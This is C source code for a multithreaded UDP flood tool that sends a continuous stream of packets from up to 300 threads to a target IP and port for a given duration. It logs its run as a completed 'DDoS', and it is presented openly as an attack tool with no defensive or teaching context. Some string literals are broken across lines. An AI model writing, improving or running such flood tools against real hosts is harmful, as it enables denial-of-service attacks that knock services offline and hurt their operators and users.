#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>

#define DEFAULT_PACKET_SIZE 512
#define MAX_SAFE_THREADS 300
#define LOGFILE "attack.log"

// Shared counters (thread-safe)
atomic_ulong total_packets;
atomic_ulong total_bytes;
atomic_int running = 1;

typedef struct {
    char ip[64];
    int port;
    int duration;
} thread_args_t;

void signal_handler(int sig) {
    atomic_store(&running, 0);
}

void log_message(const char *message) {
    FILE *log = fopen(LOGFILE, "a");
    if (!log) return;
    fprintf(log, "%s
", message);
    fclose(log);
}

void *attack_thread(void *arg) {
    thread_args_t *t = (thread_args_t *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &target.sin_addr);

    char *data = malloc(DEFAULT_PACKET_SIZE);
    if (!data) pthread_exit(NULL);
    memset(data, rand() % 255, DEFAULT_PACKET_SIZE);

    time_t start = time(NULL);
    while (atomic_load(&running) && (time(NULL) - start) < t->duration) {
        int sent = sendto(sock, data, DEFAULT_PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        if (sent > 0) {
            atomic_fetch_add(&total_packets, 1);
            atomic_fetch_add(&total_bytes, sent);
        }
    }
    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <TARGET IP> <PORT> <DURATION> [THREADS]
", argv[0]);
        return 1;
    }
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : MAX_SAFE_THREADS;
    if (threads > MAX_SAFE_THREADS) threads = MAX_SAFE_THREADS;

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);

    pthread_t *tid = malloc(sizeof(pthread_t) * threads);
    thread_args_t *targs = malloc(sizeof(thread_args_t) * threads);

    for (int i = 0; i < threads; i++) {
        strncpy(targs[i].ip, ip, 63);
        targs[i].port = port;
        targs[i].duration = duration;
        pthread_create(&tid[i], NULL, attack_thread, &targs[i]);
    }

    time_t start = time(NULL);
    while (atomic_load(&running) && (time(NULL) - start) < duration) {
        printf("
Time: %lds/%d | Packets: %lu | MB: %.2f     ",
               (time(NULL) - start), duration,
               atomic_load(&total_packets),
               (double)atomic_load(&total_bytes)/1024/1024);
        fflush(stdout);
        sleep(1);
    }
    atomic_store(&running, 0);

    for (int i = 0; i < threads; i++)
        pthread_join(tid[i], NULL);

    printf("
Attack Finished!
Packets: %lu
Megabytes: %.2f
",
           atomic_load(&total_packets),
           (double)atomic_load(&total_bytes)/1024/1024);

    free(tid);
    free(targs);
    log_message("DDoS Run Complete.");
    return 0;
}